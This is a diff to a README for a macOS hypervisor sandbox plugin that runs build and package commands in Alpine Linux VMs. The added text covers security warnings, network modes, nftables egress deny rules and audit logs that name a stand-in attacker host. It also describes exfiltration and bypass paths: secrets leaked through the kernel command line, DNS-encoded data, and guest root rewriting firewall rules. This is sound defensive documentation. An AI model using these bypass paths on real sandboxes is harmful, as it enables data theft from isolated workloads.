@@ -33,6 +33,9 @@ This plugin provides maximum isolation by running each sandbox execution in a li
 - Code signing with virtualization entitlements
 - Docker (for creating rootfs on macOS)
 
+> [!IMPORTANT]
+> **The hypervisor is the real security boundary.** Everything inside the VM (kernel, userspace, your command) runs in an isolated hardware partition. The guest Linux kernel, virtio drivers, and userspace are all *untrusted from the host's perspective*. Apple's Hypervisor.framework provides the actual containment—not the guest OS.
+
 ## How It Works
 
 ### End-to-End Flow
@@ -181,6 +184,9 @@ flowchart TB
 
 ### Boot Sequence
 
+> [!WARNING]
+> **Kernel cmdline exposes secrets to all guest processes.** Commands and environment variables are passed via the kernel command line (`/proc/cmdline`), which is world-readable inside the VM. Any process in the VM can read API keys, tokens, or other secrets passed through environment variables. For sensitive credentials, consider using a secrets file mounted via virtio-fs with restricted permissions instead.
+
 What happens inside the VM from power-on to command execution:
 
 ```mermaid
@@ -261,6 +267,9 @@ flowchart LR
 ```
 
 ### Workspace Mounting (virtiofs)
+
+> [!NOTE]
+> **virtio-fs exposes host filesystem to the VM.** The virtio-fs driver in the guest kernel has a meaningful attack surface—it's a complex filesystem protocol, not just a block device. A malicious guest with a virtio-fs kernel exploit could potentially access host memory. This is mitigated by the hypervisor boundary, but it's larger attack surface than a simple block device. For maximum paranoia, use `--workspace-isolation snapshot` (full copy) instead of virtio-fs sharing.
 
 How your project directory is shared between host and VM:
 
@@ -405,7 +414,27 @@ deputy exec --runtime plugin --plugin vz --workspace . --network host \
 | Upgrade Go/Node versions | Edit script, then `./build-alpine-rootfs.sh` |
 | Disk full (8GB limit) | `./build-alpine-rootfs.sh` or increase `--size` |
 
-**Future consideration:** A Docker-like COW mode could be implemented using QCOW2 snapshots or overlay filesystems, where each execution starts from a clean base. This would trade build speed for reproducibility. For now, rebuild the rootfs when you need a fresh start.
+**Future: Ephemeral Execution Mode**
+
+A Docker-like ephemeral mode is planned where each execution starts from a clean base image with separate persistent cache volumes:
+
+```
+~/.deputy/vz/
+├── bases/                    # Immutable base images
+│   └── alpine-go1.23.5.img   # Base with Go toolchain
+├── overlays/                 # Per-execution ephemeral layers (auto-deleted)
+│   └── exec-{uuid}/
+└── caches/                   # Persistent toolchain caches (virtiofs mounts)
+    ├── go/                   # GOMODCACHE, GOCACHE
+    └── npm/                  # npm cache
+```
+
+This would provide:
+- **Reproducibility**: Clean slate each execution
+- **Fast builds**: Toolchain caches persist across executions
+- **Easy reset**: Clear caches without rebuilding rootfs
+
+See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for the full design proposal.
 
 ### Security Boundary
 
@@ -448,6 +477,9 @@ flowchart TB
 ```
 
 ### Asset Files
+
+> [!CAUTION]
+> **Rootfs integrity is critical.** Anyone with write access to `~/.deputy/vz/` can modify the kernel, initrd, or rootfs used by all future VM executions. This is equivalent to owning the sandbox. Treat these files like you would SSH keys: protect them from unauthorized modification and consider verifying checksums before use.
 
 The files created by `build-alpine-rootfs.sh` and how they're used:
 
@@ -564,9 +596,10 @@ mkdir -p ~/go/bin && cp deputy-sandbox-vz ~/go/bin/
 deputy exec --runtime plugin --plugin vz -- uname -a
 # Expected: Linux (none) 6.18.2-0-virt #1-Alpine SMP ... aarch64 Linux
 
-# Test Go (requires network for toolchain download)
-deputy exec --runtime plugin --plugin vz --network host -- go version
+# Test Go (uses pre-installed toolchain, GOTOOLCHAIN=local prevents auto-download)
+deputy exec --runtime plugin --plugin vz -- go version
 # Expected: go version go1.23.5 linux/arm64
+# Note: If you see a download attempt, rebuild rootfs: ./build-alpine-rootfs.sh
 
 # Test workspace mounting
 deputy exec --runtime plugin --plugin vz --workspace . -- ls /workspace
@@ -890,11 +923,55 @@ kill $VZ_PID
 
 Environment variables are **optional** when using the Alpine build script, which creates symlinks for default path discovery.
 
+### VM Assets
+
 | Variable | Description | Default |
 |----------|-------------|---------|
 | `DEPUTY_VZ_KERNEL` | Path to Linux kernel (vmlinuz) | `~/.deputy/vz/vmlinuz` (symlink → alpine/) |
 | `DEPUTY_VZ_INITRD` | Path to initrd (required for Alpine) | `~/.deputy/vz/alpine/initrd.img` |
 | `DEPUTY_VZ_ROOTFS` | Path to root filesystem image | `~/.deputy/vz/rootfs.img` (symlink → alpine/) |
+
+### Security & Proxy
+
+| Variable | Description | Default |
+|----------|-------------|---------|
+| `DEPUTY_VZ_PROXY` | Deputy proxy URL for package manager traffic | (none) |
+| `DEPUTY_VZ_STRICT_PROXY` | Enable strict proxy mode with DNS blocking (`true`/`false`) | `false` |
+| `DEPUTY_VZ_USER` | Run commands as this unprivileged user instead of root | (none - runs as root) |
+
+See [Security Considerations](#security-considerations) for details on security levels and strict mode.
+
+### Non-Root Execution (Defense-in-Depth)
+
+> [!TIP]
+> **Run as non-root when possible.** While "root inside the VM" doesn't grant host access, it does give full control over the guest filesystem—including the ability to modify cached toolchains, install rootkits in the persistent rootfs, or plant files that persist across executions. Using `--user nobody` adds a meaningful layer of defense for untrusted workloads.
+
+By default, commands run as `root` inside the VM. For defense-in-depth, you can run as an unprivileged user:
+
+```bash
+# Run as "nobody" user
+DEPUTY_VZ_USER=nobody deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --network host \
+    -- go build ./...
+
+# Run as a custom "deputy" user (created if it doesn't exist)
+DEPUTY_VZ_USER=deputy deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    -- npm install
+```
+
+**How it works:**
+- The user is created inside the VM if it doesn't exist (via `adduser`/`useradd`)
+- A temporary home directory is created at `/tmp/home-<user>`
+- Go/npm caches are set up in writable directories
+- Proxy environment variables are passed through
+- For overlay workspace mode, the user gets write access to the overlay upper layer
+
+**Security benefits:**
+- Limits damage if a malicious package achieves code execution
+- Prevents modification of system files in the rootfs
+- Follows principle of least privilege
 
 ### Using Default Paths (Recommended)
 
@@ -1016,6 +1093,47 @@ deputy exec --runtime plugin --plugin vz --network host -- curl -sS https://exam
 # With timeout
 deputy exec --runtime plugin --plugin vz --timeout 30s -- long-running-task
 ```
+
+### Passing Environment Variables
+
+Pass custom environment variables to the VM using the `--env` flag:
+
+```bash
+# Pass a single environment variable
+deputy exec --runtime plugin --plugin vz --env MY_VAR=hello -- sh -c 'echo $MY_VAR'
+# Output: hello
+
+# Pass multiple environment variables
+deputy exec --runtime plugin --plugin vz \
+    --env API_KEY=secret123 \
+    --env DEBUG=true \
+    -- sh -c 'echo "API_KEY=$API_KEY DEBUG=$DEBUG"'
+
+# Force Go to use the pre-installed toolchain (prevents auto-download)
+deputy exec --runtime plugin --plugin vz --network host \
+    --env GOTOOLCHAIN=local \
+    -- go version
+# Output: go version go1.23.5 linux/arm64
+
+# Pass build flags for cross-compilation
+deputy exec --runtime plugin --plugin vz --network host \
+    --env CGO_ENABLED=0 \
+    --env GOOS=linux \
+    --env GOARCH=arm64 \
+    -- go build -o myapp ./cmd/myapp
+
+# Pass npm configuration
+deputy exec --runtime plugin --plugin vz --network host \
+    --env NPM_CONFIG_REGISTRY=https://registry.npmjs.org \
+    --env NODE_ENV=production \
+    -- npm ci
+```
+
+> [!NOTE]
+> The `--env` flag may trigger a confirmation prompt in interactive mode. Use `--dangerously-skip-prompt` in scripts/CI or press Enter to confirm interactively.
+
+> [!WARNING]
+> **Environment variables are visible in `/proc/cmdline`.** They are passed via the kernel command line, which is world-readable inside the VM. Do not pass secrets (API keys, tokens, passwords) via `--env`. For sensitive credentials, consider mounting a secrets file via the workspace with restricted permissions.
 
 ### Supply Chain Security (Package Manager Operations)
 
@@ -1286,6 +1404,223 @@ cp arch/arm64/boot/Image ~/.deputy/vz/vmlinuz
 
 ## Security Model
 
+### Defense-in-Depth Architecture ("Security Onion")
+
+> [!IMPORTANT]
+> **Layer 1 (Hypervisor) is doing the heavy lifting.** While this diagram shows five "layers," don't let the visual imply they're equally strong. The hypervisor boundary (Layer 1) provides the actual containment. Layers 2-4 are defense-in-depth—useful for limiting damage *within* the VM, but the hypervisor is what prevents escape to the host. If the hypervisor is compromised, the other layers provide minimal additional protection.
+
+The VZ plugin implements multiple concentric security layers. An attacker must compromise **all** layers to escape:
+
+```mermaid
+flowchart TB
+    subgraph Layer0["<b>Layer 0: macOS Host</b><br/><i style='color:#666'>Untrusted code NEVER runs here</i>"]
+        direction TB
+
+        subgraph HostProcesses["Host Processes"]
+            Deputy["<b>deputy CLI</b><br/>Orchestrates execution"]
+            Plugin["<b>deputy-sandbox-vz</b><br/>ConnectRPC server<br/><i>Manages VM lifecycle</i>"]
+        end
+
+        subgraph HostAssets["Host Assets (Read-Only to VM)"]
+            Kernel["vmlinuz<br/><i>Kernel binary</i>"]
+            Initrd["initrd.img<br/><i>Initial ramdisk</i>"]
+            Rootfs["rootfs.img<br/><i>ext4 filesystem</i>"]
+        end
+
+        subgraph HostNetwork["Host Network Stack"]
+            vmnet["vmnet NAT Gateway<br/><code>192.168.64.1</code>"]
+            HostInternet["Internet"]
+        end
+
+        subgraph HostFS["Host Filesystem"]
+            Workspace["<b>/Users/you/project</b><br/>Your source code"]
+            Home["~/.deputy/vz/"]
+        end
+    end
+
+    subgraph Layer1["<b>Layer 1: Apple Hypervisor.framework</b><br/><i style='color:#666'>Hardware-backed isolation boundary</i>"]
+        direction TB
+        HV["<b>Hypervisor.framework</b><br/>ARM64 hardware virtualization<br/><i>No kernel modules needed</i>"]
+
+        subgraph VMConfig["VM Configuration (Host-Controlled)"]
+            vCPU["vCPUs: 1-8<br/><i>--cpu N</i>"]
+            vMem["Memory: 256MB-16GB<br/><i>--memory Xg</i>"]
+            vDevices["<b>virtio Devices Only</b><br/>No PCI passthrough"]
+        end
+    end
+
+    subgraph Layer2["<b>Layer 2: Linux Kernel</b><br/><i style='color:#666'>Separate from host kernel</i>"]
+        direction TB
+        GuestKernel["<b>Linux 6.18.2-0-virt</b><br/>Alpine/Lima kernel<br/><i>Minimal attack surface</i>"]
+
+        subgraph KernelSecurity["Kernel Security Features"]
+            KASLR["KASLR enabled"]
+            Netfilter["nftables/netfilter<br/><i>Egress filtering</i>"]
+            SecComp["seccomp available"]
+        end
+    end
+
+    subgraph Layer3["<b>Layer 3: Userspace (deputy-init)</b><br/><i style='color:#666'>Controlled execution environment</i>"]
+        direction TB
+        Init["<b>/deputy-init</b><br/>PID 1 init script<br/><i>Parses kernel cmdline</i>"]
+
+        subgraph UserspaceSecurity["Userspace Controls"]
+            NonRoot["Non-root user<br/><i>--user nobody</i>"]
+            ReadOnlyFS["Read-only mounts<br/><i>--mode read-only</i>"]
+            Overlay["Overlay isolation<br/><i>--workspace-isolation overlay</i>"]
+        end
+
+        subgraph Execution["Command Execution"]
+            UserCmd["<b>Your command</b><br/><code>go build ./...</code>"]
+        end
+    end
+
+    subgraph Layer4["<b>Layer 4: virtio Device Boundaries</b><br/><i style='color:#666'>Constrained I/O channels</i>"]
+        direction LR
+
+        subgraph VirtioDevices["virtio Devices (All Traffic Auditable)"]
+            VBlk["<b>virtio-blk</b><br/>/dev/vda → rootfs.img<br/><i>Read-write to ephemeral clone</i>"]
+            VFS["<b>virtio-fs</b><br/>/workspace → host dir<br/><i>Configurable: RO/RW/overlay</i>"]
+            VNet["<b>virtio-net</b><br/>eth0 → vmnet NAT<br/><i>Optional, disabled by default</i>"]
+            VCon["<b>virtio-console</b><br/>stdin/stdout only<br/><i>No TTY escape sequences</i>"]
+        end
+    end
+
+    %% Connections showing data flow
+    Deputy -->|"Unix socket"| Plugin
+    Plugin -->|"VM lifecycle API"| HV
+    HV -->|"Hardware isolation"| GuestKernel
+    GuestKernel --> Init
+    Init --> UserCmd
+
+    Kernel -.->|"Boot"| GuestKernel
+    Rootfs -.->|"Clone (COW)"| VBlk
+    Workspace <-.->|"virtio-fs"| VFS
+    vmnet <-.->|"NAT (optional)"| VNet
+    Plugin <-.->|"Console I/O"| VCon
+    vmnet --> HostInternet
+
+    %% Styling
+    style Layer0 fill:#e3f2fd,stroke:#1565c0,stroke-width:3px
+    style Layer1 fill:#fff3e0,stroke:#e65100,stroke-width:3px
+    style Layer2 fill:#f3e5f5,stroke:#7b1fa2,stroke-width:3px
+    style Layer3 fill:#e8f5e9,stroke:#2e7d32,stroke-width:3px
+    style Layer4 fill:#fce4ec,stroke:#c2185b,stroke-width:3px
+
+    style HV fill:#fff3e0,stroke:#e65100
+    style GuestKernel fill:#f3e5f5,stroke:#7b1fa2
+    style Init fill:#e8f5e9,stroke:#2e7d32
+    style UserCmd fill:#ffcdd2,stroke:#c62828
+```
+
+### Security Boundaries Summary
+
+| Layer | Component | What it Protects | Compromise Required |
+|-------|-----------|------------------|---------------------|
+| **0** | macOS Host | Your files, credentials, other apps | N/A (never runs untrusted code) |
+| **1** | Hypervisor.framework | Host kernel, other VMs | Hypervisor escape (extremely rare) |
+| **2** | Guest Linux Kernel | Host via syscall interface | Kernel exploit + hypervisor escape |
+| **3** | deputy-init / userspace | Privilege escalation in VM | Userspace exploit + kernel + hypervisor |
+| **4** | virtio devices | I/O channel abuse | Device driver bug + all above |
+
+### Ingress/Egress Control Points
+
+```mermaid
+flowchart LR
+    subgraph Ingress["<b>INGRESS</b><br/><i>What enters the VM</i>"]
+        direction TB
+        I1["<b>Kernel cmdline</b><br/>Command, env vars, config<br/><i>Base64 encoded, host-controlled</i>"]
+        I2["<b>virtio-fs</b><br/>Workspace files<br/><i>Can be read-only</i>"]
+        I3["<b>virtio-blk</b><br/>Rootfs (tools, runtime)<br/><i>Ephemeral COW clone</i>"]
+        I4["<b>virtio-net</b><br/>Network packets<br/><i>Disabled by default</i>"]
+    end
+
+    subgraph Controls["<b>CONTROLS</b>"]
+        direction TB
+        C1["<code>--mode read-only</code><br/>Workspace read-only"]
+        C2["<code>--network none</code><br/>No network device"]
+        C3["<code>--network allowlist</code><br/>nftables egress filter"]
+        C4["<code>--user nobody</code><br/>Non-root execution"]
+        C5["<code>--workspace-isolation</code><br/>overlay/snapshot/git-worktree"]
+    end
+
+    subgraph Egress["<b>EGRESS</b><br/><i>What leaves the VM</i>"]
+        direction TB
+        E1["<b>virtio-console</b><br/>stdout/stderr<br/><i>Parsed by plugin</i>"]
+        E2["<b>virtio-fs</b><br/>File changes<br/><i>Can be blocked/reviewed</i>"]
+        E3["<b>virtio-net</b><br/>Network traffic<br/><i>Auditable, filterable</i>"]
+        E4["<b>Exit code</b><br/>0-255<br/><i>Parsed from output</i>"]
+    end
+
+    I1 --> Controls
+    I2 --> Controls
+    I3 --> Controls
+    I4 --> Controls
+    Controls --> E1
+    Controls --> E2
+    Controls --> E3
+    Controls --> E4
+
+    style Ingress fill:#e3f2fd,stroke:#1565c0
+    style Controls fill:#fff3e0,stroke:#e65100
+    style Egress fill:#ffcdd2,stroke:#c62828
+```
+
+### Attack Surface Analysis
+
+| Attack Vector | Default State | Mitigation | How to Harden Further |
+|---------------|---------------|------------|----------------------|
+| **Network exfiltration** | Blocked (no eth0) | `--network none` default | Use `--network allowlist` for restricted access |
+| **Filesystem escape** | Contained | virtio-fs boundaries | `--mode read-only`, `--workspace-isolation overlay` |
+| **Privilege escalation** | root in VM | Isolated kernel | `--user nobody` for non-root execution |
+| **Supply chain attack** | Possible during build | Network disabled post-fetch | Two-phase execution, strict proxy mode |
+| **Symlink traversal** | Possible in workspace | virtio-fs path resolution | `os.Root`-based cleanup (Go 1.24+) |
+| **Rootfs tampering** | Possible | Ephemeral COW clones | Changes discarded after execution |
+| **Time-of-check attacks** | Possible | N/A | Use overlay mode for atomic changes |
+
+### Current Limitations & Future Improvements
+
+| Current State | Limitation | Future Improvement |
+|---------------|------------|-------------------|
+| Root in VM by default | Process runs as root | `--user` flag to run as non-root |
+| Single VM user | No user namespace mapping | UID/GID mapping for workspace files |
+| No nested virtualization | Can't run Docker/gVisor in VM | Nested virt support in future macOS |
+| Trust rootfs contents | Must trust build script | Signed/verified rootfs images |
+| No seccomp by default | All syscalls allowed | Syscall allowlist profile |
+| No resource quotas | CPU/mem soft limits only | cgroups-based hard limits |
+
+### Defense-in-Depth Checklist
+
+For maximum security when running untrusted code:
+
+```bash
+# Maximum isolation configuration
+deputy exec --runtime plugin --plugin vz \
+    --network none \                          # No network device
+    --mode read-only \                        # Workspace read-only
+    --workspace-isolation snapshot \          # Full copy, changes isolated
+    --user nobody \                           # Non-root execution
+    --cpu 1 \                                 # Limit CPU
+    --memory 512m \                           # Limit memory
+    -- ./untrusted-script.sh
+
+# Dependency installation with network (controlled)
+deputy exec --runtime plugin --plugin vz \
+    --network allowlist \                     # Filtered network
+    --network-allow 'proxy.golang.org:443' \  # Only Go proxy
+    --network-allow 'sum.golang.org:443' \    # Only Go checksum
+    --network-audit blocked \                 # Log blocked connections
+    --workspace-isolation overlay \           # Changes in overlay
+    --preserve-workspace \                    # Review before applying
+    -- go mod download
+
+# Two-phase for maximum supply chain security
+deputy exec --runtime plugin --plugin vz \
+    --two-phase \                             # Network in phase 1, offline in phase 2
+    --prefetch-command 'go mod download' \    # Fetch with network
+    -- go build ./...                         # Build offline
+```
+
 The VM boundary provides stronger isolation than containers:
 
 1. **Separate Kernel**: Each VM runs its own kernel; kernel vulnerabilities cannot escape
@@ -1304,45 +1639,319 @@ The VM boundary provides stronger isolation than containers:
 | Startup Time | ~1ms | ~5ms | ~100ms | ~50ms | ~70ms |
 | Overhead | None | Low | Low | Medium | Medium |
 
-### Networking
+### Network Modes
 
-The VZ plugin supports NAT networking via macOS's built-in vmnet framework. When `--network host` or `--network bridge` is specified, the VM obtains an IP address via DHCP from the macOS vmnet DHCP server.
+> [!TIP]
+> **Network isolation is genuine.** When `--network none` is specified (the default), no `eth0` device exists in the VM—there's no network stack to attack. This is unlike some container runtimes where "no network" still leaves a loopback interface with potential IPC channels. With VZ, disabled network means the virtio-net device is never attached to the VM configuration.
 
-**How it works:**
+The VZ plugin supports multiple network modes that control VM network access:
+
+| Mode | Flag | Description | Use Case |
+|------|------|-------------|----------|
+| `NONE` | `--network none` | No network device attached | Maximum isolation (default) |
+| `HOST` | `--network host` | NAT networking via vmnet | Download dependencies, access internet |
+| `BRIDGE` | `--network bridge` | NAT networking (bridged unavailable) | Same as HOST* |
+| `ALLOWLIST` | `--network allowlist` | NAT + guest nftables filtering | Restricted access |
+
+*True bridged networking requires `com.apple.vm.networking` entitlement which is restricted and can't be used with ad-hoc code signing. BRIDGE mode falls back to NAT.
+
+### Network Audit Mode
+
+For debugging and security monitoring, the `--network-audit` flag logs network connection attempts:
+
+| Mode | Description |
+|------|-------------|
+| `blocked` | Log only blocked/dropped connections (useful for debugging allowlist) |
+| `all` | Log all connections (both allowed and blocked) |
+
+```bash
+# Debug which connections are being blocked
+deputy exec --runtime plugin --plugin vz \
+    --network allowlist \
+    --network-allow 'proxy.golang.org:443' \
+    --network-audit blocked \
+    -- go build ./...
+
+# Full visibility into network activity
+deputy exec --runtime plugin --plugin vz \
+    --network host \
+    --network-audit all \
+    -- npm install
+```
+
+**Note:** Network audit currently outputs to the VM's stdout which is visible in debug logs. With `--network allowlist` mode, nftables logs both allowed and dropped connections. With `--network host`, all connections are allowed so only `all` mode shows traffic.
+
+#### Network Audit Event Format
+
+The plugin parses network audit events from the VM's nftables log and outputs them in a structured format:
+
+```
+<<<DEPUTY_NETAUDIT:ALLOW:TCP:proxy.golang.org:443>>>
+<<<DEPUTY_NETAUDIT:DROP:TCP:evil.example.com:443>>>
+```
+
+**Current implementation:**
+- Events are parsed by the VZ plugin and logged via `slog.Debug()`
+- Events are visible when running with `DEPUTY_LOG_LEVEL=debug`
+
+#### Future: OpenTelemetry Integration
+
+The path forward for production-ready network audit monitoring integrates with Deputy's existing OpenTelemetry infrastructure (`internal/otel/metrics.go`). This will enable:
+
+1. **Metrics Export**: Network connections as OTel metrics
+   - `deputy.sandbox.network.connections` counter with attributes:
+     - `action`: "allow" | "drop"
+     - `protocol`: "TCP" | "UDP"
+     - `destination`: hostname or IP
+     - `port`: destination port
+   - `deputy.sandbox.network.blocked_total` counter for security alerting
+
+2. **Span Events**: Network audit entries as span events on the sandbox execution trace
+   - Correlates network activity with specific command executions
+   - Enables distributed trace analysis in Jaeger/Tempo
+
+3. **Log Export**: Structured logs via OTel log SDK
+   - JSON-formatted audit log entries
+   - Compatible with log aggregation systems (Loki, Elasticsearch)
+
+**Proposed CLI flags:**
+```bash
+# Export network audit to OTel (requires OTEL_EXPORTER_OTLP_ENDPOINT)
+deputy exec --runtime plugin --plugin vz \
+    --network allowlist \
+    --network-allow 'proxy.golang.org:443' \
+    --network-audit all \
+    --network-audit-export otel \
+    -- go build ./...
+
+# Export to local JSON file
+deputy exec --runtime plugin --plugin vz \
+    --network-audit all \
+    --network-audit-export file \
+    --network-audit-file ./network-audit.jsonl \
+    -- npm install
+```
+
+**Implementation path:**
+1. Add `SandboxNetworkConnection` metric to `internal/otel/metrics.go`
+2. Update sandbox manager to accept network audit events from plugins
+3. Forward events to OTel via `RecordSandboxNetworkConnection()` helper
+4. Add `--network-audit-export` flag to `deputy exec`
+
+### Network Architecture
+
+```mermaid
+flowchart TB
+    subgraph VM["Alpine Linux VM"]
+        App["Application<br/><code>go build ./...</code>"]
+        eth0["eth0<br/><code>192.168.64.x</code>"]
+    end
+
+    subgraph macOS["macOS Host"]
+        vmnet["vmnet NAT Gateway<br/><code>192.168.64.1</code>"]
+        DHCP["DHCP Server"]
+        NAT["NAT Engine"]
+    end
+
+    subgraph Internet["Internet"]
+        DNS["1.1.1.1<br/><i>Cloudflare DNS</i>"]
+        Proxy["proxy.golang.org"]
+        NPM["registry.npmjs.org"]
+    end
+
+    App --> eth0
+    eth0 <-->|"DHCP"| DHCP
+    eth0 -->|"Traffic"| vmnet
+    vmnet --> NAT
+    NAT --> DNS & Proxy & NPM
+
+    note["vmnet gateway does NOT<br/>forward DNS queries!"]
+    vmnet -.-> note
+
+    style note fill:#fff3e0,stroke:#e65100
+```
+
+**How NAT networking works:**
 1. The VM boots with a virtio-net device attached (`eth0`)
-2. The `deputy-init` script brings up the interface and runs `dhclient`
-3. macOS vmnet assigns an IP from the `192.168.64.0/24` subnet (configurable via `/Library/Preferences/SystemConfiguration/com.apple.vmnet.plist`)
+2. The `deputy-init` script brings up the interface and runs `dhclient` or `udhcpc`
+3. macOS vmnet assigns an IP from the `192.168.64.0/24` subnet
 4. DNS resolution uses public DNS servers (1.1.1.1, 8.8.8.8) since vmnet gateway doesn't forward DNS
+
+### Network Mode Examples
+
+```bash
+# No network (default, maximum isolation)
+deputy exec --runtime plugin --plugin vz -- ./offline-tool
+
+# NAT networking for downloading dependencies
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --network host \
+    -- go build ./...
+
+# Bridge mode (uses NAT due to entitlement restrictions)
+deputy exec --runtime plugin --plugin vz \
+    --network bridge \
+    -- curl https://example.com
+
+# Allowlist mode (requires kernel netfilter support)
+deputy exec --runtime plugin --plugin vz \
+    --network allowlist \
+    --network-allow proxy.golang.org \
+    --network-allow sum.golang.org \
+    -- go build ./...
+```
+
+### Network Mode Comparison
+
+| Feature | NONE | HOST | BRIDGE | ALLOWLIST |
+|---------|------|------|--------|-----------|
+| Network device | No | Yes | Yes | Yes |
+| Internet access | No | Yes | Yes | Restricted |
+| Isolation | Maximum | NAT boundary | NAT boundary | NAT + filtering |
+| DNS queries | N/A | Public DNS | Public DNS | Public DNS |
+| Outbound connections | Blocked | Allowed | Allowed | Allowlist only* |
+
+*Allowlist enforcement requires kernel with `CONFIG_NETFILTER=y`
+
+**Isolation guarantee:** When `--network none` (the default), no network device is attached to the VM. The VM has no eth0 interface and cannot make any network connections, regardless of DNS configuration or other settings. This provides complete network isolation at the hypervisor level.
 
 **Requirements for network modes:**
 - The rootfs must include a DHCP client (`dhclient` or `udhcpc`)
-- The rootfs built by `build-rootfs.sh` includes `isc-dhcp-client` by default
+- The rootfs built by `build-alpine-rootfs.sh` includes both by default
 
-### Network Filtering Limitations
+### ALLOWLIST Mode: Egress Filtering
 
-For fine-grained network control (allowlists), network filtering uses **guest-level nftables** instead of host-level vmnet controls. This has important implications:
+ALLOWLIST mode provides network egress filtering using **nftables in the guest kernel**. This enables fine-grained control over which hosts the VM can connect to, preventing data exfiltration and limiting supply chain attack surface.
 
-| Approach | Host-Level (vmnet) | Guest-Level (nftables) |
-|----------|-------------------|------------------------|
-| Entitlement | `com.apple.vm.networking` (restricted) | None required |
-| Ad-hoc signing | ❌ Not supported | ✅ Works |
-| Enforcement point | macOS kernel | Linux guest kernel |
-| Bypass risk | None (host controls) | Requires guest kernel exploit |
-| DNS filtering | Full control | Requires kernel netfilter support |
+**How it works:**
 
-**Current Limitations:**
+```mermaid
+flowchart TB
+    subgraph VM["Alpine Linux VM"]
+        App["Application<br/><code>npm install lodash</code>"]
+        nft["nftables<br/><i>deputy_filter table</i>"]
+        eth0["eth0"]
+    end
 
-1. **Kernel netfilter required for allowlists**: The guest kernel must have `CONFIG_NETFILTER=y` and related nftables modules. The Ubuntu 24.04 cloud kernel (`vmlinuz-generic`) does **not** include netfilter support by default, causing nftables commands to fail with "Protocol not supported."
+    subgraph Policy["nftables Rules (OUTPUT chain)"]
+        direction TB
+        R1["policy drop<br/><i>Default: block all</i>"]
+        R2["oif lo accept<br/><i>Allow loopback</i>"]
+        R3["ct state established accept<br/><i>Allow return traffic</i>"]
+        R4["udp/tcp dport 53 accept<br/><i>Allow DNS</i>"]
+        R5["udp dport 67/68 accept<br/><i>Allow DHCP</i>"]
+        R6["ip daddr 104.x.x.x accept<br/><i>Allowlisted hosts</i>"]
+    end
 
-2. **Guest-side enforcement**: A malicious process with root inside the guest could theoretically modify or bypass nftables rules. However, this requires kernel-level access inside the VM.
+    subgraph macOS["macOS Host"]
+        vmnet["vmnet NAT"]
+    end
 
-3. **DNS queries may bypass filtering**: Without proper nftables setup, allowlist rules only affect direct IP connections. DNS queries to the default resolver still work, allowing hostname resolution for blocked destinations (though connections will fail if the IP isn't in the allowlist).
+    subgraph Internet["Internet"]
+        Allowed["registry.npmjs.org<br/><i>✓ Allowed</i>"]
+        Blocked["evil.attacker.com<br/><i>✗ Blocked</i>"]
+    end
 
-**Solutions:**
+    App --> nft
+    nft --> eth0
+    eth0 --> vmnet
 
-- **Full isolation**: Use `--network none` for complete network isolation (recommended for untrusted code)
-- **Custom kernel**: Build a kernel with `CONFIG_NETFILTER=y` for nftables support
-- **Application-level proxy**: Future enhancement to route all traffic through a host-side filtering proxy
+    vmnet -->|"Port 443"| Allowed
+    vmnet -.-x|"Dropped by nftables"| Blocked
+
+    style Allowed fill:#c8e6c9,stroke:#2e7d32
+    style Blocked fill:#ffcdd2,stroke:#c62828
+```
+
+**Example: Secure npm install**
+
+```bash
+# Only allow npm registry and GitHub - all other egress blocked
+deputy exec --runtime plugin --plugin vz \
+    --workspace . \
+    --network allowlist \
+    --network-allow registry.npmjs.org:443 \
+    --network-allow github.com:443 \
+    -- npm install
+```
+
+**nftables rules generated:**
+
+```
+table inet deputy_filter {
+    chain output {
+        type filter hook output priority filter; policy drop;
+        oif "lo" accept                           # Loopback
+        ct state established,related accept        # Return traffic
+        udp dport 53 accept                        # DNS (needed for resolution)
+        tcp dport 53 accept
+        udp dport 67 accept                        # DHCP
+        udp sport 68 accept
+        ip daddr 104.16.0.0/12 tcp dport 443 accept  # npm registry
+        ip daddr 140.82.0.0/16 tcp dport 443 accept  # GitHub
+    }
+}
+```
+
+**Security characteristics:**
+
+| Aspect | ALLOWLIST Mode |
+|--------|----------------|
+| Entitlement required | None (uses guest nftables) |
+| Enforcement point | Linux guest kernel |
+| Default policy | DROP all outbound |
+| DNS | Allowed (needed for hostname resolution) |
+| Return traffic | Allowed (via connection tracking) |
+| Host-level bypass | Not possible (nftables in guest) |
+| Guest-level bypass | Requires guest root + kernel exploit |
+
+**How hostname resolution works:**
+
+1. VM boots with NAT networking
+2. `deputy-init` parses `--network-allow` hosts from kernel cmdline
+3. For each host, `getent ahostsv4` resolves hostname to IPv4
+4. nftables rules are added for the resolved IP addresses
+5. DNS queries (port 53) are allowed so the app can resolve other names
+6. But connections to non-allowlisted IPs are blocked
+
+**Current limitations:**
+
+1. **IPv4 only**: Hostname resolution currently filters for IPv4 addresses. IPv6 support could be added.
+
+2. **Resolution at boot**: Hostnames are resolved once at VM boot. If DNS returns multiple IPs or IPs change, some connections may fail.
+
+3. **Guest-side enforcement**: A malicious process with root inside the VM could theoretically modify nftables rules. However, this requires:
+   - Root access inside the VM (the init script runs as root)
+   - Knowledge of how to modify nftables
+   - In practice, supply chain attacks in npm/go/pip packages rarely include kernel-level exploits
+
+4. **DNS queries leak information**: DNS queries are allowed (needed for the app to work), so an attacker could encode data in DNS queries. For maximum security, use `--network none`.
+
+**Recommendations:**
+
+| Use Case | Network Mode | Reason |
+|----------|--------------|--------|
+| Untrusted code execution | `--network none` | Maximum isolation |
+| Package installation (npm, go) | `--network allowlist` | Allow only registries |
+| General development | `--network host` | Convenience |
+| Production builds | `--network allowlist` | Prevent exfiltration |
+
+**Future: VZVmnetNetworkDeviceAttachment (macOS 26+)**
+
+Apple is adding `VZVmnetNetworkDeviceAttachment` in macOS 26 which will enable true vmnet-based networking **without** the restricted `com.apple.vm.networking` entitlement. This will unlock:
+
+| Feature | Current (NAT) | Future (Vmnet) |
+|---------|---------------|----------------|
+| Entitlement required | None (NAT), Restricted (bridged) | **None** |
+| Ad-hoc signing | NAT only | **Full vmnet support** |
+| True bridged networking | ❌ | ✅ |
+| Inter-VM communication | ❌ | ✅ (SharedMode) |
+| Host-level network control | ❌ | ✅ |
+
+Track progress: [Code-Hex/vz#205](https://github.com/Code-Hex/vz/pull/205)
+
+Once macOS 26 is released and the vz library is updated, we can implement true BRIDGE mode without the entitlement restriction.
 
 ### Clock Synchronization
 
@@ -1361,7 +1970,7 @@ Mon Jan 13 19:58:00 UTC 2026
